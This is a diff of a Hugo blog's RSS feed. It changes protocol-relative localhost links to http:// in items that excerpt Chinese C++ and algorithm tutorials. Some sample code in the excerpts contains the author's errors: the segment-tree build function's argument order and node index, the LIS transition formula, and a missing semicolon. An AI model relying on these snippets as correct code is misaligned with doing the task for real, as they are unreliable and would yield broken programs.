-      <guid>//localhost:1313/posts/cpp/cpp-function/</guid>
+      <guid>http://localhost:1313/posts/cpp/cpp-function/</guid>
       <description>C++筆記-目錄 函式與遞迴 之前有在講變數作用範圍時偷偷寫了一個函式，現在將會說明如何使用。&#xA;到目前，我們都只用到main函式而已，假設我們有需要重複使用的程式碼，可以寫成函式，&#xA;只要丟參數進去，就能得到傳回值。&#xA;先以最基礎的線性函數(y=ax+b)開始，可以這樣寫&#xA;1 2 3 int f(int x){ return a*x+b; } 只要我們帶x進去，函式就會傳回計算後的值，使用函式的過程稱為呼叫&#xA;1 2 3 cout &amp;lt;&amp;lt; f(0) &amp;lt;&amp;lt; endl; int y = f(2); cout &amp;lt;&amp;lt; y &amp;lt;&amp;lt; endl; 而函式可以選擇接受或不接受參數，也能自訂型態&#xA;1 2 3 4 void f(){ // 不接受參數 可以做任何事; return; // 使用void就不會回傳值 } 而上一章字串介紹的empty()，其實也是一個布林函式&#xA;1 2 3 4 bool empty(){ if (字串沒東西) return true; else return false; } 而遞迴就是函式自己呼叫自己而已，&#xA;現在利用遞迴概念，我們試著寫寫看計算階乘(n乘到1)的函式&#xA;1 2 3 4 5 long long f(int n){ //計算 n!</description>
     </item>
     <item>
       <title>C&#43;&#43;筆記-增加程式可讀性</title>
-      <link>//localhost:1313/posts/cpp/cpp-simplify/</link>
+      <link>http://localhost:1313/posts/cpp/cpp-simplify/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <guid>//localhost:1313/posts/cpp/cpp-simplify/</guid>
+      <guid>http://localhost:1313/posts/cpp/cpp-simplify/</guid>
       <description> C++筆記-目錄 簡化程式可讀性 現在基礎語法已經學得差不多了，現在來談談如何讓別人更容易看懂自己的程式，之後若跟別人合寫也讓人比較容易除錯。&#xA;我認為要讓人容易看懂自己的程式碼，有以下幾點需要注意&#xA;善用註解，說明邏輯 變數名稱取名有意義的文字會更好 如果有沒有用到的函式、變數就不用多寫 可以在每次操作完輸出變數檢查 避免跳來跳去的結構，像是goto 重複的程式碼可以濃縮成函式或迴圈 </description>
     </item>
     <item>
       <title>C&#43;&#43;筆記-字元字串</title>
-      <link>//localhost:1313/posts/cpp/cpp-string/</link>
+      <link>http://localhost:1313/posts/cpp/cpp-string/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <guid>//localhost:1313/posts/cpp/cpp-string/</guid>
+      <guid>http://localhost:1313/posts/cpp/cpp-string/</guid>
       <description>C++筆記-目錄 字元字串 之前提到了字元宣告，但未提及如何利用，現在我們試試這個程式碼：&#xA;1 2 3 4 5 6 #include&amp;lt;bits/stdc++.h&amp;gt; using namespace std; int main(){ int a=&amp;#39;a&amp;#39;,b=&amp;#39;z&amp;#39;; for(int i=a;i&amp;lt;=b;i++) cout &amp;lt;&amp;lt; i &amp;lt;&amp;lt; endl; } 你會發現它輸出了97~122，注意我使用了整數型態，卻用字元初始化，&#xA;沒錯，經過型態轉換，&amp;lsquo;a&amp;rsquo;會變成97，&amp;lsquo;z&amp;rsquo;會變成122，其實這就是ascii碼，因此我們其實可以用字元做計算， 現在可以試試看如果改成&amp;rsquo;A&amp;rsquo;~&amp;lsquo;Z&amp;rsquo;會對應到哪些ascii碼呢。&#xA;字元的宣告要用char，而字串就是字元型態的陣列啦~&#xA;，不過這次我們使用在C++比較常用的string(字串)來講解，&#xA;如果不使用萬能函式庫，必須include &amp;lt;string&amp;gt;。&#xA;string可以這樣宣告&#xA;1 2 3 4 string s1; //空字串 string s2(&amp;#34;abcde&amp;#34;); //用字面常量宣告初始化 string s3(s2); // 複製s2 string s4 = &amp;#34;edasd&amp;#34;; // 用字面常量宣告初始化 string可以用size()或length()直接查看字數(字串長度)，用empty()確認是否是空字串，甚至可以直接用==比較字串內容是否相同，&#xA;1 2 3 4 5 6 7 8 9 10 string s1 = &amp;#34;abcde&amp;#34;; string s2; cout &amp;lt;&amp;lt; s1 &amp;lt;&amp;lt; endl; cout &amp;lt;&amp;lt; &amp;#34;字串1長度=&amp;#34;&amp;lt;&amp;lt;s1.</description>
     </item>
     <item>
       <title>C&#43;&#43;筆記-字面常數</title>
-      <link>//localhost:1313/posts/cpp/cpp-literal/</link>
+      <link>http://localhost:1313/posts/cpp/cpp-literal/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <guid>//localhost:1313/posts/cpp/cpp-literal/</guid>
+      <guid>http://localhost:1313/posts/cpp/cpp-literal/</guid>
       <description>C++筆記-目錄 字面常數 程式中的 0, 1, 1.1 都叫字面常數，代表程式的符號，&#xA;整型字面常數包含 2, 8, 10, 16 進位，其中 2 進位是 C++14 才加入的&#xA;1 2 3 4 5 6 7 8 #include&amp;lt;bits/stdc++.h&amp;gt; using namespace std; int main(){ int base10 = 1234; // 十進位 int base8 = 0373; // 八進位 int base16 = 0xf1; // 十六進位 int base2 = 0b1010; // 二進位 } 對於整數，cout 都會以十進位輸出，試試看輸出上面程式中的變數會出現什麼數值。&#xA;有時要做運算時可能發現直接使用數字計算，編譯器會報錯，比如要某個型態為 long long 的值加上 10，這時可以在 10 後面加上 LL，編譯器就會把 10 看作 long long 型態計算了。</description>
     </item>
     <item>
       <title>C&#43;&#43;筆記-指標</title>
-      <link>//localhost:1313/posts/cpp/cpp-pointer/</link>
+      <link>http://localhost:1313/posts/cpp/cpp-pointer/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <guid>//localhost:1313/posts/cpp/cpp-pointer/</guid>
+      <guid>http://localhost:1313/posts/cpp/cpp-pointer/</guid>
       <description>C++筆記-目錄 指標 觀念 現在我們要寫一個交換兩個數的函式，如果這樣寫會發生什麼事呢&#xA;1 2 3 4 5 6 7 8 9 10 11 12 #include&amp;lt;bits/stdc++.h&amp;gt; using namespace std; void swap(int x,int y){ int t=x;x=y;y=t; } int main(){ int a=1,b=2; swap(a,b); cout &amp;lt;&amp;lt; a &amp;lt;&amp;lt; &amp;#34; &amp;#34; &amp;lt;&amp;lt; b &amp;lt;&amp;lt; endl; return 0; } Output: 1 2&#xA;奇怪，ab沒有被交換，&#xA;其實，這程式相當於我們又宣告了xy並交換xy，ab跟xy並沒有關係，這時我們就需要用到指標了。&#xA;要取得變數的指標，只需在它前面加上 &amp;amp; 就好，如果我們輸出 &amp;amp;a，會得到它的記憶體位址。&#xA;而指標的型態，取決於它從哪種變數取得指標，int指標型別就是 int*，double指標型別是double*&#xA;宣告指標的方式也很簡單&#xA;1 2 int a; int *b = &amp;amp;a; // *放在靠int或是靠變數名稱都可以 上面程式代表b是a的指標&#xA;如果不初始化指標，建議將值設為0或者nullptr(空指標)，避免造成不可預期的結果</description>
     </item>
     <item>
       <title>C&#43;&#43;筆記-未定義行為</title>
-      <link>//localhost:1313/posts/cpp/cpp-ub/</link>
+      <link>http://localhost:1313/posts/cpp/cpp-ub/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <guid>//localhost:1313/posts/cpp/cpp-ub/</guid>
+      <guid>http://localhost:1313/posts/cpp/cpp-ub/</guid>
       <description>C++筆記-目錄 未定義行為(Undeﬁned Behavior，簡稱 UB) 有時我們執行程式時，會發現程式的行為不是我們預期的，有時候就是未定義行為惹的禍。&#xA;一些例子 1. 順序未定義 考慮以下程式碼：&#xA;1 2 int i = 10; i = i++ + ++i; 這段的程式碼最後 i 值無法預期，因為沒有規定 i++ 和 ++i 哪個先執行，不一樣的編譯器可能會有不同的結果。&#xA;而像以下程式碼也是錯誤的寫法&#xA;1 2 3 int arr[10]; int i = 0; arr[i] = i++; 2. 除以零 1 2 int a = 5; int q = a / 0; 除以零是未定義行為，而在 float、double、long double 類型除以零的結果，根據 IEEE 754，可能是 inf 或 nan(Not A Number)。&#xA;3. 溢值 1 2 int x = 2147483647; // 假設 32 位元 int y = x + 1; 4.</description>
     </item>
     <item>
       <title>C&#43;&#43;筆記-流程控制</title>
-      <link>//localhost:1313/posts/cpp/cpp-process/</link>
+      <link>http://localhost:1313/posts/cpp/cpp-process/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <guid>//localhost:1313/posts/cpp/cpp-process/</guid>
+      <guid>http://localhost:1313/posts/cpp/cpp-process/</guid>
       <description>C++筆記-目錄 流程控制 選擇結構 藉由前面那些知識，可以做出基本的運算跟輸出輸入了，現在我們可以給程式&amp;quot;做選擇&amp;quot;，實現更多功能。&#xA;題目：&#xA;輸入一個正整數，如果他是偶數則輸出Yes，否則輸出No。&#xD;這時我們可以使用 if(如果)， 用法：&#xA;1 2 3 if(條件式(condition) ){ //當條件成立要做的事 } 而這題的寫法如：&#xA;1 2 3 4 5 6 7 8 9 10 11 12 #include&amp;lt;bits/stdc++.h&amp;gt; using namespace std; int main(){ int n; cin &amp;gt;&amp;gt; n; if(n%2==0){ // 當 n 除以 2 的餘數為0 cout &amp;lt;&amp;lt; &amp;#34;Yes&amp;#34; &amp;lt;&amp;lt; endl; } if(n%2!=0){ // 當 n 除以 2 的餘數不為0 cout &amp;lt;&amp;lt; &amp;#34;No&amp;#34; &amp;lt;&amp;lt; endl; } } 在條件式中，我們判斷 n % 2 是否等於 0，% 是取模運算符號，又稱取餘數， n % 2 意思是 n 除以 2 的餘數。</description>
     </item>
     <item>
       <title>C&#43;&#43;筆記-浮點數</title>
-      <link>//localhost:1313/posts/cpp/cpp-float/</link>
+      <link>http://localhost:1313/posts/cpp/cpp-float/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <guid>//localhost:1313/posts/cpp/cpp-float/</guid>
+      <guid>http://localhost:1313/posts/cpp/cpp-float/</guid>
       <description>C++筆記-目錄 浮點數 名言：「算錢用浮點，遲早被人扁。」 浮點數是一個很難理解的東西，&#xA;這裡特別拿出來說明。&#xA;宣告 如果遇到一定要用浮點數的情況，請使用 double 或 long double 的型態，&#xA;不要使用 float！ 不要使用 float！ 不要使用 float！ IEEE 754 與浮點數誤差 現在還沒有完整的方式可以存一個實數，目前電腦的儲存方式是採用 IEEE 754 標準&#xA;IEEE 754&#xA;IEEE754是自20世紀80年代以來現代電腦最廣泛使用的浮點數運算標準，除了浮點數的表示以外，它還定義了關於負0、反常值以及其運算子與例外情況，像是inf(Infinite)、nan(Not A Number)這些特殊數值。&#xA;我們要先知道如何做進制轉換， 欲將十進位轉成二進位，對於整數部分，就是一直除以2直到商數為0，再依序由下往上取出餘數：&#xA;而小數則相反，需要一直乘以2直到變成0為止，且每次的運算都只取小數部分，再依序由上往下取出整數。&#xA;假設要轉換 432.1 為二進制，&#xA;計算 結果 餘數 432/2 216 0 216/2 108 0 108/2 54 0 54/2 27 0 27/2 13 1 13/2 6 1 6/2 3 0 3/2 1 1 1/2 0 1 由下往上寫結果就是 110110000&#xA;對小數部分</description>
     </item>
     <item>
       <title>C&#43;&#43;筆記-物件(結構體)</title>
-      <link>//localhost:1313/posts/cpp/cpp-struct/</link>
+      <link>http://localhost:1313/posts/cpp/cpp-struct/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <guid>//localhost:1313/posts/cpp/cpp-struct/</guid>
+      <guid>http://localhost:1313/posts/cpp/cpp-struct/</guid>
       <description>C++筆記-目錄 物件(結構體) Struct 現在我們要幫銀行寫一個管理系統，管理每個帳戶的資料，資料要含有：名字、身分證號、戶籍地、性別、出生年月日、存額。&#xA;我們發現每個資料需要的型態好像不一樣，不適合用陣列，但要存的資料數量卻都一樣， 這時我們可以建立一種物件了，其實就是自訂資料型態！&#xA;1 2 3 4 5 6 7 8 struct Account{ // 建立&amp;#34;帳戶&amp;#34;這個型態 string name; // 名字 string ID; // 身分證號 string Living; // 戶籍地 bool gender; // 性別(大多數情況就男女之分(? 所以用bool) long long birthday; // 出生日期 long long balance; // 帳戶餘額 }; //要分號 這樣，我們就能把它當成一種型態來操作了，假設要開新帳戶：&#xA;1 Account a; 如果要存取帳戶內容，&#xA;1 2 3 a.name = &amp;#34;吉娃娃&amp;#34;; a.ID = &amp;#34;A12345678&amp;#34;; ... 當然如果有很多帳戶，也能直接宣告陣列&#xA;1 2 Account Arr[100]; Arr[0].name = &amp;#34;吉娃娃&amp;#34;; 我們也可以在結構體裡宣告函式，比如計算一點跟它自己的距離：</description>
     </item>
     <item>
       <title>C&#43;&#43;筆記-目錄</title>
-      <link>//localhost:1313/posts/cpp-index/</link>
+      <link>http://localhost:1313/posts/cpp-index/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <guid>//localhost:1313/posts/cpp-index/</guid>
+      <guid>http://localhost:1313/posts/cpp-index/</guid>
       <description>所有內容將以Windows 10+,MinGW-w64 GNU 8.1.0 C++17為主 運作原理與基礎模板 變數 邏輯與運算子 浮點數 巨集(補充) IO 字面常數 流程控制 陣列 字串 函式與遞迴 指標 物件(結構體) 簡化程式可讀性 未定義行為 Reference Openhome </description>
     </item>
     <item>
       <title>C&#43;&#43;筆記-語法</title>
-      <link>//localhost:1313/posts/cpp/</link>
+      <link>http://localhost:1313/posts/cpp/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <guid>//localhost:1313/posts/cpp/</guid>
+      <guid>http://localhost:1313/posts/cpp/</guid>
       <description>*所有內容將以Windows 10+,MinGW-w64 GNU 8.1.0 C++17為主&#xA;程式碼運作原理 我們知道其實電腦只懂0與1，因此想跟電腦溝通就需要透過一些轉譯，&#xA;在人類的世界中所使用的語言叫高階語言，而只由0與1數字組成的語言稱為機器語言，我們很難看懂，&#xA;要將高階語言轉成機器語言，就需要藉由編譯器與組譯器的幫忙，編譯器可以幫我們把程式碼轉成所謂的組合語言，此時階段&#xA;就會有很多人開始看不懂了，當然如果有學過還是能稍微看懂，但組合語言經過組譯器就會變成0跟1，只有電腦才看得懂。&#xA;基礎C++模板 附上STL標頭檔：&#xA;1 #include&amp;lt;bits/stdc++.h&amp;gt; 注意，比競程時再用他，如果是其他用途(大型專案)的話最好是不要引入這個&#xA;這個標頭檔包含了之後會使用到的任何輸入輸出、資料結構，還藏有很多很方便的函式像是 &amp;lt;algorithm&amp;gt; 裡的__gcd(計算最大公因數)&#xA;不過有些編譯器不包含這個標頭檔，可以自己Google找到對應的解決方法。&#xA;而在只有輸入輸出這些簡單的程式中，我們使用 &amp;lt;iostream&amp;gt; 就好&#xA;1 #include &amp;lt;iostream&amp;gt; 有時候看別人的Code還會看到一個標頭檔 &amp;lt;bits/extc++.h&amp;gt; ，那是內建紅黑樹、雜湊表的標頭檔等更進階的東西，現在暫時不理他。&#xA;為了方便，會在下面定義名稱空間 using namespace std; ，為什麼要加這個？因為我們需要將程式的幾乎所有東西都被定義到一個叫std的名稱空間裡，這樣在做像是輸入輸出(cin、cout)等操作時 不需要在每個句子前面加上 std:: 這種東西，也就是這段程式是起到了類似宣告成了全域變數的作用。 打個比喻，如果說標頭檔是圖書館，那std就是你想找的書。&#xA;而每個程式都會需要一個叫做main的主函式，這個函式就是整個程式的起點跟終點：&#xA;1 2 3 int main(){ return 0; // 函式結束後，要使用這句話回傳一個值，來告訴程式已經執行完了。 } 在這裡就是將main函式宣告成int(整數)，因此結束後也要回傳一個整數才行，而它也可以被宣告為signed(我習慣宣告成這個)，這個等下會提到。&#xA;注意到，有些程式句後面加了分號有些卻沒有，這是C++中規定的，以分號作為一段程式的結束(句點)，而當在引入標頭檔以及有大括號時則不需要分號，因為在C++，&amp;ldquo;引入標頭檔&amp;quot;這個行為就是以換行為這段程式碼的結束。同樣地，只要編譯器讀完大括號，就算是將這裡面的東西執行完了。&#xA;總結程式碼(模板)： 1 2 3 4 5 6 #include&amp;lt;iostream&amp;gt; using namespace std; int main(){ cout &amp;lt;&amp;lt; &amp;#34;Hello World&amp;#34;; // 你會看到電腦跟你說Hello World return 0; } 註解 在上面兩個程式碼中，會看到裡面寫了 // 後面接上說明，稱為&amp;quot;註解&amp;rdquo;，註解的內容不會被編譯器讀取，註解有兩種模式： 單行註解及多行註解，在C++裡的語法是這樣的</description>
     </item>
     <item>
       <title>C&#43;&#43;筆記-變數</title>
-      <link>//localhost:1313/posts/cpp/cpp-variable/</link>
+      <link>http://localhost:1313/posts/cpp/cpp-variable/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <guid>//localhost:1313/posts/cpp/cpp-variable/</guid>
+      <guid>http://localhost:1313/posts/cpp/cpp-variable/</guid>
       <description>C++筆記-目錄 變數概論 當我們要進行複雜運算時，變數成為很重要的東西，你可以用變數儲存各種資料，讓電腦記住它。&#xA;要如何宣告一個變數？格式為 (變數型態) (變數名稱)，我們可以一次宣告很多變數： (型態) (名稱),(名稱),(名稱)...;&#xA;ex: int a,b,c;&#xA;要注意的是，變數的名稱在同作用範圍下不可重複，只能為英數字、底線(_)、開頭不可為數字、且不能是C++裡面已經定義的名稱(ex:int, char, double, long&amp;hellip;)&#xA;變數型態： 根據型態的不同，儲存所需容量也會不同，依照平台而有所差異，如果想知道該型態佔了多少空間，可以使用 sizeof()， 以下所提的空間都是在多數 32 位元機器上佔有空間&#xA;一、整數 integer 每種整數資料型態都會有一定的值域，若超過的話會發生溢位，使得答案出錯 而 signed/unsigned 表示型態含不含符號，而負數前面都會有一個 &amp;ldquo;-&amp;rdquo; ，因此當型態為 unsigned 時，是將所有負值的空間加到正值，讓正值值域更大&#xA;型態 空間 範圍 描述 short/short int 2 Bytes -2^15~2^15-1 短整數 unsigned short/unsigned short int 2 Bytes 0~2^16-1 無符號短整數 int/long int/signed/signed long int/long 4 Bytes -2^31~2^31-1 整數 unsigned int/unsigned long int/unsigned 4 Bytes 0~2^32-1 無符號整數 long long/long long int 8 Bytes -2^63~2^63-1 長整數 unsigned long long/unsigned long long int 8 Bytes 0~2^64-1 無符號長整數 二、浮點數 float 就是有小數點的變數</description>
     </item>
     <item>
       <title>C&#43;&#43;筆記-運作原理與基礎模板</title>
-      <link>//localhost:1313/posts/cpp/cpp-init/</link>
+      <link>http://localhost:1313/posts/cpp/cpp-init/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <guid>//localhost:1313/posts/cpp/cpp-init/</guid>
+      <guid>http://localhost:1313/posts/cpp/cpp-init/</guid>
       <description>C++筆記-目錄 程式碼運作原理 我們知道其實電腦只懂 0 與 1，因此想跟電腦溝通就需要透過一些轉譯，&#xA;在人類的世界中所使用的語言叫高階語言，而只由 0 與 1 數字組成的語言稱為機器語言，我們很難看懂，&#xA;要將高階語言轉成機器語言，就需要藉由編譯器與組譯器的幫忙，編譯器可以幫我們把程式碼轉成所謂的組合語言，此時階段&#xA;就會有很多人開始看不懂了，當然如果有學過還是能稍微看懂，但組合語言經過組譯器就會變成0跟1，只有電腦才看得懂。&#xA;基礎C++模板 附上STL標頭檔：&#xA;1 #include&amp;lt;bits/stdc++.h&amp;gt; 注意，比競程時再用他，如果是其他用途(大型專案)的話最好是不要引入這個&#xA;這個標頭檔包含了之後會使用到的任何輸入輸出、資料結構，還藏有很多很方便的函式像是 &amp;lt;algorithm&amp;gt; 裡的 __gcd(計算最大公因數)&#xA;不過有些編譯器不包含這個標頭檔，可以自己 Google 找到對應的解決方法。&#xA;而在只有輸入輸出這些簡單的程式中，我們使用 &amp;lt;iostream&amp;gt; 就好&#xA;1 #include &amp;lt;iostream&amp;gt; 有時候看別人的Code還會看到一個標頭檔 &amp;lt;bits/extc++.h&amp;gt; ，那是內建紅黑樹、雜湊表的標頭檔等更進階的東西，現在暫時不理他。&#xA;為了方便，會在下面定義名稱空間 using namespace std; ，為什麼要加這個？因為我們需要將程式的幾乎所有東西都被定義到一個叫 std 的名稱空間裡，這樣在做像是輸入輸出 (cin, cout) 等操作時 不需要在每個句子前面加上 std:: 這種東西，也就是這段程式是起到了類似宣告成了全域變數的作用。 打個比喻，如果說標頭檔是圖書館，那 std 就是你想找的書。&#xA;而每個程式都會需要一個叫做 main 的主函式，這個函式就是整個程式的起點跟終點：&#xA;1 2 3 int main(){ return 0; // 函式結束後，要使用這句話回傳一個值，來告訴程式已經執行完了。 } 在這裡就是將main函式宣告成int(整數)，因此結束後也要回傳一個整數才行，而它也可以被宣告為signed(我習慣宣告成這個)，這個等下會提到。&#xA;注意到，有些程式句後面加了分號有些卻沒有，這是 C++ 中規定的，以分號作為一段程式的結束(句點)，而當在引入標頭檔以及有大括號時則不需要分號，因為在 C++，&amp;ldquo;引入標頭檔&amp;quot;這個行為就是以換行為這段程式碼的結束。同樣地，只要編譯器讀完大括號，就算是將這裡面的東西執行完了。&#xA;Cout cout 是程式的嘴巴，負責讓電腦說話，只要使用 &amp;lt;&amp;lt; 把文字傳給 cout 後，程式就會說出你給的台詞！</description>
     </item>
     <item>
       <title>C&#43;&#43;筆記-邏輯與運算子</title>
-      <link>//localhost:1313/posts/cpp/cpp-operator/</link>
+      <link>http://localhost:1313/posts/cpp/cpp-operator/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <guid>//localhost:1313/posts/cpp/cpp-operator/</guid>
+      <guid>http://localhost:1313/posts/cpp/cpp-operator/</guid>
       <description>C++筆記-目錄 表達式 Expression 有人常言道：「表達式(計算式)的天職，就是得到一個值。」&#xA;1 + 2 是一個表達式，其中 1 是一個運算元，2 是另一個運算元，而 + 是運算子。&#xA;1 + ( 2 - 3 ) 也是一個表達式，這個表達式裡還有一個表達式 ( 2 - 3 )，稱為複合表達式(Compound Expression)&#xA;而等等會看到的 a = 5，其實也是一個表達式，將 5 賦值給 a，那麼這個表達式得到的值當然就是最後賦值給 a 的數值。&#xA;運算子 Operator 運算子可簡單區分為一元(單元)運算子、二元運算子以及三元運算子。&#xA;每個運算子都有執行的優先順序，如同數學有先乘除後加減，以下是之後可能會在 c++ 看到的運算子：&#xA;優先度 運算子 描述 閱讀順序 例子 1 :: 作用域 -&amp;gt; std::cout &amp;laquo; endl; 2 ++/-- () [] . -&amp;gt; 先回傳再加減1 \ 函式呼叫 \ 陣列存取 \ 物件存取成員 \ 指標存取成員 -&amp;gt; i++/i--; int a = f(x); int a[10]; obj.</description>
     </item>
     <item>
       <title>C&#43;&#43;筆記-陣列</title>
-      <link>//localhost:1313/posts/cpp/cpp-array/</link>
+      <link>http://localhost:1313/posts/cpp/cpp-array/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <guid>//localhost:1313/posts/cpp/cpp-array/</guid>
+      <guid>http://localhost:1313/posts/cpp/cpp-array/</guid>
       <description>C++筆記-目錄 陣列 現在寫個小程式，輸入N，然後輸入N個數字，最後把N個數字顛倒輸出，&#xA;如果我們輸入的N達到幾千幾萬，那宣告幾千幾萬個變數太不切實際了。我們其實可以一次宣告很多變數，&#xA;宣告方式： 資料型態 名稱[長度];&#xA;這裡的長度需要是編譯時期的常數，像是&#xA;1 2 int a[100]; double b[100]; 只有在GCC的編譯環境我們可以使用&#xA;1 int a[n]; 如果要動態宣告，要用到其他資料結構跟動態記憶體宣告，之後會在講指標提到。&#xA;再來我們就能使用a[0],a[1],a[2]&amp;hellip;a[n-1]當作每個變數了，&#xA;在[ ]中的數字，我們稱之為&amp;quot;索引值&amp;quot;，索引值對應的值，稱為&amp;quot;元素&amp;quot;，特別注意，&#xA;索引值是從0開始的，即0代表第1個元素，1代表第2個元素，n-1代表第n個元素 如果貿然存取未初始化或超出陣列索引範圍的地方會出現無法預測的情況&#xA;參考：C++筆記-未定義行為&#xA;剛剛宣告完的陣列是沒有初始化的，&#xA;我們可以一次初始化全部元素，&#xA;1 int a[100]={0}; // 將這100個元素全部初始化為0 或者直接初始化每個陣列值&#xA;1 int a[5]={1,5,4,3,2}; 如果我們只初始化前面幾個元素，剩下的元素會自動初始化為0&#xA;1 2 int a[5]={1,5,4}; // a[0]=1,a[1]=5,a[2]=4,a[3]=0,a[4]=0 最後我們可以寫出剛剛那題的程式了&#xA;1 2 3 4 5 6 7 8 9 10 11 #include&amp;lt;bits/stdc++.h&amp;gt; using namespace std; int main(){ int n; cin &amp;gt;&amp;gt; n; int a[n]; // GCC for(int i=0;i&amp;lt;n;i++) cin &amp;gt;&amp;gt; a[i]; //利用上次講的for迴圈輸入每個變數值，注意從0開始 for(int i=n-1;i&amp;gt;=0;i--) cout &amp;lt;&amp;lt; a[i] &amp;lt;&amp;lt; endl; //倒序輸出，注意最後一個索引值是n-1 } 如果要宣告二維陣列存更多東西，其實就是每個元素都是一個陣列</description>
     </item>
     <item>
       <title>算法筆記-DP-LIS</title>
-      <link>//localhost:1313/posts/1/algo-dp-lis/</link>
+      <link>http://localhost:1313/posts/1/algo-dp-lis/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <guid>//localhost:1313/posts/1/algo-dp-lis/</guid>
+      <guid>http://localhost:1313/posts/1/algo-dp-lis/</guid>
       <description>算法筆記目錄 最長遞增子列(Longest Increasing Subsequence) 考慮以下問題：&#xA;給一個序列，求一個最長的遞增子序列，如 [1,3,2,2,4,0] 中，最長的遞增子序列為 [1,3,4] 或 [1,2,4]。&#xA;定義狀態： $dp_i$ 代表掃到第$i$個數時的LIS長度&#xA;轉移式： $dp_i = max(dp_j\ | j&amp;lt;i \land a_j&amp;lt;i) + 1$ 表示當發現$a_j &amp;lt; a_i$，則LIS長度+1&#xA;邊界狀況： 最小的遞增子列至少為1&#xA;1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 // Top-Down #include&amp;lt;bits/stdc++.h&amp;gt; using namespace std; const int MAXN = 1005 int a[MAXN],dp[MAXN]; int DP(int i){ if(dp[i]&amp;gt;0) return dp[i]; dp[i] = 1; for(int j=0;j&amp;lt;i;++j) if(a[j]&amp;lt;a[i]) dp[i] = max(dp[i],DP(j)+1); return dp[i]; } int main(){ int n; cin &amp;gt;&amp;gt; n; for(int i=0;i&amp;lt;n;++i) cin &amp;gt;&amp;gt; a[i]; int ans = 0; for(int i=0;i&amp;lt;n;++i) ans = max(ans,DP(i)); cout &amp;lt;&amp;lt; ans &amp;lt;&amp;lt; endl; return 0; } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 // Buttom-Up #include&amp;lt;bits/stdc++.</description>
     </item>
     <item>
       <title>算法筆記-初階資料結構</title>
-      <link>//localhost:1313/posts/1/algo-primary-structure/</link>
+      <link>http://localhost:1313/posts/1/algo-primary-structure/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <guid>//localhost:1313/posts/1/algo-primary-structure/</guid>
+      <guid>http://localhost:1313/posts/1/algo-primary-structure/</guid>
       <description>算法筆記目錄 初階資料結構 1.Segment Tree - 線段樹 Segment Tree是一種二元樹，適合解決RMQ問題(查詢區間極值)、區間和， 適合用於單點修改、區間修改。&#xA;成功實現Sparse Table做不到的事。&#xA;每個節點可以存一種區間的數據(比如區間和)，&#xA;根節點存[1,n]的數據，每個左子節點編號是index*2，右邊為index*2+1，&#xA;左邊紀錄[l,(l+r)/2)，右邊紀錄[(l+r)/2+1,r]。&#xA;通常，線段樹會開4倍大&#xA;1 int T[4*N],a[N]; // int T[N&amp;lt;&amp;lt;2]; 建立線段樹，若l==r，此節點即a[l] 子樹建完後就把資料合併&#xA;1 2 3 4 5 6 7 8 9 10 11 void build(int l,int r,int index){ if(l==r){ T[l] = a[l]; } else{ int mid = l+(r-l)/2; // 避免 (l+r)/2 溢位 build(index*2,l,mid); // build(index&amp;lt;&amp;lt;1,l,mid); build(index*2+1,mid+1,r); T[index] = T[index*2] + T[index*2+1] ; } } 詢問區間(ql,qr:要查的區間 l,r:此節點儲存的左右界) 1 2 3 4 5 6 7 8 int query(int ql,int qr,int l,int r,int index){ if(ql&amp;lt;=l &amp;amp;&amp;amp; qr&amp;gt;=r) return T[index]; int mid = l+(r-l)/2; int rt=0; if(ql&amp;gt;mid) rt+=query(ql,qr,mid+1,r,index*2+1); if(qr&amp;lt;=mid) rt+=query(ql,qr,l,mid,index*2); return rt; } 單點修改 1 2 3 4 5 6 7 8 9 void modify(int l,int r,int pos,int index,int val){ if(l==r){ T[index] = val;return; } int mid = l+(r-l)/2; if(pos&amp;lt;=mid) modify(l,mid,pos,index*2,val); else modify(mid+1,r,pos,index*2+1,val); T[index] = T[index*2]+T[index*2+1]; } 懶人標記 如果想在[l,r]中的所有元素加值怎麼辦？ 不可能一個一個呼叫modify吧。</description>
     </item>
     <item>
       <title>算法筆記-基本資料結構</title>
-      <link>//localhost:1313/posts/1/algo-basic-structure/</link>
+      <link>http://localhost:1313/posts/1/algo-basic-structure/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <guid>//localhost:1313/posts/1/algo-basic-structure/</guid>
+      <guid>http://localhost:1313/posts/1/algo-basic-structure/</guid>
